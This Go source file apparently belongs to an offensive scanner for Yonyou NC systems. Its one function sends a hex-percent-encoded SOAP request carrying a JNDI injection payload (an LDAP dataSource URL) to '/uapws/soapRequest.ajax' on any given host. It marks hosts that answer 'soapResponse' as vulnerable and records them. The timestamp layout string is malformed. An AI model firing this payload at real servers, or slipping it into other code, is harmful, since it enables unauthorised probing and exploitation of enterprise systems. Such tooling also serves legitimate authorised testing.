package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func AjaxjndiScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	ajaxjndi := "用友 ajax JNDI注入漏洞"
	urls := address + "/uapws/soapRequest.ajax"
	response, _ := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("ws=nc.itf.msgcenter.IMsgCenterWebService&soap=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%65%6e%76%3a%45%6e%76%65%6c%6f%70%20%78%6d%6c%6e%73%3a%65%6e%76%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%73%6f%61%70%2f%65%6e%76%65%6c%6f%70%65%2f%22%20%78%6d%6c%6e%73%3a%73%6e%3d%22%68%74%74%70%3a%2f%2f%6d%73%67%63%65%6e%74%65%72%2e%69%74%66%2e%6e%63%2f%49%4d%73%67%43%65%6e%74%65%72%57%65%62%53%65%72%76%69%63%65%22%3e%0d%0a%20%20%3c%65%6e%76%3a%48%65%61%64%65%72%2f%3e%0d%0a%20%20%3c%65%6e%76%3a%42%6f%64%79%3e%0d%0a%20%20%20%20%3c%73%6e%3a%75%70%6c%6f%61%64%41%74%74%61%63%68%6d%65%6e%74%3e%0d%0a%20%20%20%20%20%20%3c%64%61%74%61%53%6f%75%72%63%65%3e%6c%64%61%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%33%38%39%2f%54%65%73%74%3c%2f%64%61%74%61%53%6f%75%72%63%65%3e%0d%0a%20%20%20%20%20%20%3c%6d%73%67%74%79%70%65%3e%3f%3c%2f%6d%73%67%74%79%70%65%3e%0d%0a%20%20%20%20%20%20%3c%70%6b%5f%73%6f%75%72%63%65%6d%73%67%3e%3f%3c%2f%70%6b%5f%73%6f%75%72%63%65%6d%73%67%3e%0d%0a%20%20%20%20%20%20%3c%66%69%6c%65%6e%61%6d%65%3e%3f%3c%2f%66%69%6c%65%6e%61%6d%65%3e%0d%0a%20%20%20%20%20%20%3c%66%69%6c%65%3e%3f%3c%2f%66%69%6c%65%3e%0d%0a%20%20%20%20%3c%2f%73%6e%3a%75%70%6c%6f%61%64%41%74%74%61%63%68%6d%65%6e%74%3e%0d%0a%20%20%3c%2f%65%6e%76%3a%42%6f%64%79%3e%0d%0a%3c%2f%65%6e%76%3a%45%6e%76%65%6c%6f%70%3e"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "soapResponse") {
		result := ajaxjndi + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename) // 保存结果到文本文件
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, ajaxjndi, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, ajaxjndi)
		fmt.Println(output)
	}
}
